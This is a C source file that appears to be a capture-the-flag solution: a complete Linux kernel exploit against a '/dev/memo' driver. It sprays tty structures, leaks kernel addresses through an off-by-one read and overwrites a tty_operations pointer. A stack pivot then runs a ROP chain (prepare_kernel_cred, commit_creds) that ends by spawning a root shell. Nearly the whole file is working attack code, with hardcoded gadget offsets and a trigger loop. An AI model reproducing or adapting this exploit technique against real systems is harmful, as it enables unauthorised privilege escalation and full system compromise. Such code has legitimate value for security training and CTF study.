#include <stdio.h>
#include <stdarg.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>
#include <sys/ioctl.h>

#define MAX_SIZE 0x400

#define info(fmt, ...) \
  fprintf(stderr, "[+] "fmt"\n", ##__VA_ARGS__)

#define IS_PRINTABLE(c) (((c) > 31) && ((c) < 127))

void hexdump(void *buffer, size_t size) {
  unsigned char *data = buffer;
  size_t j;
  for (size_t i = 0; i < size; i++) {
    printf("%02x ", data[i]);
    if (((i % 16) == 15) || (i == size - 1)) {
      printf(" |");
      for (j = (i - (i % 16)); j <= i; j++) printf("%c", IS_PRINTABLE(data[j]) ? data[j] : '.');
      printf("|\n"); 
    } 
  }
}

typedef uint64_t u64;

static void win() {
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  printf("!win!\n");
  execve("/bin/sh", argv, envp);
}

u64 user_ss, user_sp, user_cs, user_rflags;

void save_state() {
  __asm__ (
    ".intel_syntax noprefix;"
    "mov user_ss, ss;"
    "mov user_sp, rsp;"
    "mov user_cs, cs;"
    "pushf;"
    "pop user_rflags;"
    ".att_syntax;"
  );  
  info("state saved");
}

int fds[50];

void spray() {
  for (size_t i = 0; i < 50; i++) { 
    fds[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (fds[i] < 0) {
      perror("open /dev/ptmx");
    }
  }
}

typedef struct fake_tty {
  int magic;    //  0
  int kref;     //  4
  void *dev;    //  8 
  void *driver; // 16
  void *ops;    // 24    
} tty;

int main(void) {
  info("start exploit");
  save_state();
  int rc;
  
  int fd = open("/dev/memo", O_RDWR);
  if (fd < 0) {
    perror("open");
    exit(1);
  }

  
  // ------ DEBUG ------
  // this value is needed to verify with gdb that buf_base actually contains the right value 
  // u64 dummy = 0x4141414141414141;
  // rc = lseek(fd, 0, SEEK_SET);
  // rc = write(fd, &dummy, 8);

  // Here I filled the last 8 bytes of the "legit" buffer with CCCCCCCC.
  // Then with pwndbg I searched for that pattern and I obtained the offset of this
  // address from one of the tty_struct entries. Ugly but it worked.
  
  // rc = lseek(fd, 0x400-8, SEEK_SET);
  // if (rc < 0) {
  //   perror("lseek val");
  //   exit(1);
  // }
  // u64 val = 0x4343434343434343;
  // rc = write(fd, &val, 8);
  // if (rc < 0) {
  //   perror("write val");
  // }

  unsigned char *tmp = malloc(0x1000);  
  memset(tmp, 0x42, 0x1000);
  
  spray();
   
  rc = lseek(fd, 0x3FF, SEEK_SET);  
  if (rc < 0) {
    perror("lseek");
    exit(1);
  }
  
  rc = read(fd, tmp, 0x400);
  if (rc <= 0) {
    perror("read");
    exit(1);
  }
  
  tmp++; // skip last legit buffer trailing byte

  u64 tty_entry = *(u64*)((u64*)tmp+7);
  info("tty leak: 0x%lx", tty_entry);
  
  // 0x40 is the offset of buf_end-8 from our leak. 
  // Then we can easly find buf_base from buf_end-8 knowing its len (0x400); 
  u64 buf_base = (tty_entry-0x40)+8-0x400;
  info("buf_base: 0x%lx", buf_base);
  info("buf_end: 0x%lx", buf_base+0x400);
  
  tty *laked_tty = (tty*)(tmp); // addr of ptm_unix98_lookup global struct tty_operations

  info("tty_magic (should be 0x5401): 0x%x", laked_tty->magic);
  info("tty_ops: %p", laked_tty->ops); 

  u64 kbase = (u64)laked_tty->ops - 0xe65900;
  info("kbase: 0x%lx", kbase);

  // -- overwrite tty struct --
  unsigned char *payload = calloc(1, 0x1000);

  // build fake struct tty_operations     
  u64 *p = (u64*)payload;
  for (size_t i = 0; i < 0x40; i++)
    p[i] = 0xffffffffdead0000 + (i << 8);

  // write fake struct tty_operations at the beginning of the buffer
  rc = lseek(fd, 0, SEEK_SET);
  if (rc < 0) {
    perror("lseek payload");
    exit(1);
  }  

  rc = write(fd, payload, 50*8);
  if (rc < 0) {
    perror("write payload");
    exit(1);
  }

  memset(payload, 0, 0x1000);

  // overwrite tty_ops entry in tty_struct
  tty *f = (tty*)(payload+1); // we have to skip the first byte since it still is part of the legit buffer
  f->magic = 0x5401;
  f->kref = 1;

  int i = 1;
  u64 *ftty = (u64*)(payload+1);
  ftty[i++] = kbase+0x1aac0; // tty dev
  ftty[i++] = (u64)laked_tty->driver; // tty driver
  ftty[i++] = buf_base;      // tty ops

  i++; // skip 4th slot

  /* a = prepare_kernel_cred(NULL) */
  ftty[i++] = kbase + 0x1268;  // pop rdi ; ret
  ftty[i++] = 0x00;          
  ftty[i++] = kbase + 0x7bb50; // prepare_kernel_cred

  /* commit_creds(a) */
  ftty[i++] = kbase + 0x4c852; // pop rcx ; ret
  ftty[i++] = 0x00;
  ftty[i++] = kbase + 0x19dcb; // mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret
  ftty[i++] = kbase + 0x7b8b0; // commit_creds  

  /* return to usermode */
  ftty[i++] = kbase + 0xa00a45; // swapgs_restore_regs_and_return_to_usermode+0x16
  ftty[i++] = 0xdeadbeef;
  ftty[i++] = 0xdeadbeef;
  ftty[i++] = (u64)win;
  ftty[i++] = user_cs;
  ftty[i++] = user_rflags;
  ftty[i++] = user_sp;
  ftty[i++] = user_ss;
  
  // send payload
  rc = lseek(fd, 0x3FF, SEEK_SET);
  if (rc < 0) {
    perror("lseek");
    exit(1);    
  }
  
  rc = write(fd, payload, 0x400);
  if (rc < 0) {
    perror("lseek");
    exit(1);
  }

  /*
    --- ROP ---
    rbp = buf_base+0x400 (fake tty begin)

    let's say that A=tty_struct address (buf end)
    from kernel panic logs, we can see that RBP == A

    after leave ; ret:
      RIP = RBP+8 (A+8)
    since A+8 == f->dev, we have to put the next gadget at f->dev.

    This gadget is: add rsp, 0x18; ret.
    By adding that value to rsp, we preserve the fake tty struct attributes. 
  */

  /* stack pivoting */
  /* tty_operations vtable entry offset: 12 (0xc00 >> 8, because kernel crash on RIP value = ffffffffdead[0c00]) */
  u64 *start_chain = p+12;
  *start_chain = kbase + 0x8ae7; // leave ; ret
      
  rc = lseek(fd, 0, SEEK_SET);
  if (rc < 0) {
    perror("lseek final payload");
    return 1;
  }
  
  rc = write(fd, p, 0x400);
  if (rc < 0) {
    perror("write final payload");
    return 1;
  }
  
  // trigger 
  for (size_t i = 0; i < 50; i++)
    ioctl(fds[i], 0xdeadbeef, 0xcafebabe);
  
  info("end exploit");
  return 0;
}
